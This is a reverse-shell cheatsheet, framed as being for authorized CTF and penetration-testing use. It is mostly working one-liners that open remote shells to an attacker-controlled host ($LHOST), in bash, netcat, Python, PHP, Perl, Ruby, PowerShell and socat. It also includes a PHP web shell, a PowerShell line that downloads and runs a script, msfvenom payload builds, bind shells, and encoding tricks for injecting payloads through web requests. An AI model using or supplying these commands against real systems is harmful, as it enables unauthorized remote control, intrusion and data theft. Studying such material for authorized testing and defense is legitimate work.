# Reverse Shell Cheatsheet

> For authorized CTF / penetration-testing / educational use ONLY.
> Use exclusively on systems you own or have explicit written permission to test.

## Placeholder Convention
- `$LHOST` = YOUR attacker IP (the listener) — e.g. `10.10.14.5`
- `$LPORT` = YOUR listening port — e.g. `4444`, `9001`, `443`
Replace these everywhere below. Tip: `export LHOST=10.10.14.5 LPORT=4444`.

---

## 1. Listeners (start these FIRST, before firing a shell)

```bash
nc -lvnp $LPORT                      # classic netcat listener (-l listen -v verbose -n no-dns -p port)
rlwrap nc -lvnp $LPORT               # rlwrap = arrow keys + history in the caught shell
ncat -lvnp $LPORT                    # nmap's ncat
ncat --ssl -lvnp $LPORT              # TLS listener (pair with ncat --ssl client)
socat -d -d TCP-LISTEN:$LPORT,reuseaddr STDOUT     # socat listener
socat file:`tty`,raw,echo=0 TCP-LISTEN:$LPORT      # fully-interactive socat listener
pwncat-cs -lp $LPORT                 # pwncat: auto-stabilizes + upload/download/persistence
# Metasploit multi/handler:
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
```

---

## 2. Bash

```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
# Alternative file-descriptor form:
0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; bash <&196 >&196 2>&196
# Base64-encoded (useful when chars get mangled):
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64
bash -c '{echo,BASE64HERE}|{base64,-d}|bash'
```

## 3. sh / POSIX (when bash isn't present)

```sh
sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1
/bin/sh -i 2>&1 | nc $LHOST $LPORT
```

## 4. Netcat

```bash
# If your nc supports -e (traditional/GNU netcat):
nc $LHOST $LPORT -e /bin/bash
nc.exe $LHOST $LPORT -e cmd.exe          # Windows

# OpenBSD nc (NO -e) -> use a named pipe (mkfifo):
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f
# busybox variant:
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f
```

## 5. Python

```bash
# python (2)
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$LHOST'",'$LPORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

## 6. PHP

```php
php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("$LHOST",$LPORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
// Web shell payload (drop in a .php you can reach):
<?php system($_GET['cmd']); ?>      // then ?cmd=... to trigger a shell command
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"); ?>
```

## 7. Perl

```bash
perl -e 'use Socket;$i="'$LHOST'";$p='$LPORT';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## 8. Ruby

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("'$LHOST'","'$LPORT'");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e'f=TCPSocket.open("'$LHOST'","'$LPORT'").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## 9. PowerShell (Windows)

```powershell
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sbt,0,$sbt.Length);$stream.Flush()};$client.Close()"
# Download-and-run (fetch a hosted ps1 reverse shell):
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')"
# Base64-encode for -EncodedCommand to dodge quoting issues:
# pwsh:  [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -e <BASE64UTF16LE>
```

## 10. socat (most stable interactive shell)

```bash
# Listener (your box):
socat file:`tty`,raw,echo=0 TCP-L:$LPORT
# Target (already fully interactive — no upgrade needed):
socat TCP:$LHOST:$LPORT EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
# If target has no socat, transfer a static socat binary first.
```

---

## 11. msfvenom Payloads

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
# Windows Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o met.exe
# PHP
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
# JSP (Tomcat etc.)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp
# WAR (deploy to Tomcat manager)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
# Raw shellcode (Python/C buffer)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f python -b "\x00"
# Catch all of the above with multi/handler (set matching payload).
```

---

## 12. Shell Stabilization / Upgrade (do this immediately after catching a shell)

```bash
# Step 1 (on the target) — spawn a PTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'
#   no python?  ->  script /dev/null -c bash      OR      /usr/bin/script -qc /bin/bash /dev/null
# Step 2 — background the shell:  press Ctrl+Z
# Step 3 (on YOUR box) — fix the local terminal:
stty raw -echo; fg
#   (press Enter once or twice)
# Step 4 (back in the target shell) — set terminal type and dimensions:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 cols 200          # match your window: get values with `stty size` locally
# Now Ctrl+C, tab-completion, arrows, and clear work properly.
```

Quick easier alternative: just use `pwncat-cs -lp $LPORT` or `rlwrap nc -lvnp $LPORT` so you get a usable shell without manual upgrading.

---

## 13. Bind Shells (target listens, you connect)

```bash
# Target (opens a listener):
nc -lvnp $LPORT -e /bin/bash                  # nc with -e
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp $LPORT >/tmp/f   # OpenBSD nc
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",'$LPORT'));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
# You then connect:
nc $TARGET $LPORT
```

---

## 14. Delivering Payloads Through the Web (URL-encoding note)

When you inject a reverse shell via a URL parameter, form field, or header, special characters
(spaces, `&`, `/`, `<`, `>`, `;`, `|`, `+`) must be **URL-encoded** or they break the request.

```
space=%20  &=%26  /=%2F  ;=%3B  |=%7C  +=%2B  <=%3C  >=%3E  '=%27  "=%22  newline=%0a
```
```bash
# Encode a whole payload quickly:
python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" \
  'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```
Double-encode (`%2520` etc.) if the target decodes once before processing. When in doubt,
base64 the bash payload and run the `{echo,...}|{base64,-d}|bash` form to avoid encoding pitfalls entirely.

---

## 15. Quick Reference Card

| Need | Command |
|---|---|
| Start listener | `rlwrap nc -lvnp $LPORT` |
| Best Linux one-liner | `bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1` |
| No bash | mkfifo + `nc` |
| Fully interactive | `socat` both ends |
| Stabilize | `python3 -c 'import pty;pty.spawn("/bin/bash")'` then `Ctrl+Z` / `stty raw -echo; fg` |
| Windows | PowerShell TCPClient one-liner or msfvenom exe |

Reference (online): https://www.revshells.com — generate any of these with your IP/port filled in.
